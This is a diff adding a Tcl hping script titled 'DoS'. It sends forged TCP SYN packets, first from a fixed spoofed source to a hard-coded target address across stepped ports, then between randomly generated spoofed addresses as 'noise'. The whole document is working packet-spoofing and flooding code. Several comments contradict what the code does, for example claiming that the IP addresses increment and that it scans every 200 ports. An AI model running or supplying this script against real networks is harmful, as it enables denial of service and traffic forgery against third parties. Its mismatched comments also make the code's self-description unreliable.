@@ -1,0 +1,69 @@
+#########################################################################
+# Title: DoS
+# 
+# Description: This TCL script sends spoofed packets on the network. The
+# 	       source ip increments as well as the destination IP.
+#	       The source port and destination stays the fixed.  
+#########################################################################
+
+set  sSuffix .3.4.5
+set  dSuffix .3.4.5
+set  aperiod .
+
+#Scan every 200 ports to 0-20000 ports from 22.3.4.5
+for {set i 1} {$i < 14000} {incr i 1000} {
+   #Source suffix is equivalent 
+   set destPort 30000
+   #Set the destination as 20 more than sSuffix
+   set sourcePort $i
+   
+   #Set Source and Destination Address
+   set saddress 130.32.87.6
+   set daddress 132.3.4.5
+   
+   #Display source address to terminal
+   puts "Source=$saddress, Destination=$daddress, sPort= $sourcePort, dPort = $destPort "
+ 
+   #Create a packet 
+   set syn {}
+   append syn "ip(saddr=$saddress,daddr=$daddress)"
+   append syn "+tcp(sport=$sourcePort,dport=$destPort,flags=2)"
+
+   #Send the pack
+   hping send $syn
+}
+
+
+#Add noise
+for {set i 1} {$i < 14000} {incr i 500} {
+   #Source suffix is equivalent 
+
+   #Set the destination as 20 more than sSuffix	
+   set sourcePort [expr {int(rand()*50000)}];
+   set destPort [expr {int(rand()*30000)}];
+   
+   set sourceIPA [expr {int(rand()*253)}];
+   set sourceIPB [expr {int(rand()*253)}];
+   set sourceIPC [expr {int(rand()*253)}];
+   set sourceIPD [expr {int(rand()*253)}];
+
+   set destIPA [expr {int(rand()*253)}];
+   set destIPB [expr {int(rand()*253)}];
+   set destIPC [expr {int(rand()*253)}];
+   set destIPD [expr {int(rand()*253)}];
+
+   #Set Source and Destination Address
+   set saddress $sourceIPA$aperiod$sourceIPB$aperiod$sourceIPC$aperiod$sourceIPD
+   set daddress $destIPA$aperiod$destIPB$aperiod$destIPC$aperiod$destIPD
+   
+   #Display source address to terminal
+   puts "Source=$saddress, Destination=$daddress, sPort= $sourcePort, dPort = $destPort "
+ 
+   #Create a packet 
+   set syn {}
+   append syn "ip(saddr=$saddress,daddr=$daddress)"
+   append syn "+tcp(sport=$sourcePort,dport=$destPort,flags=2)"
+
+   #Send the pack
+   hping send $syn
+}
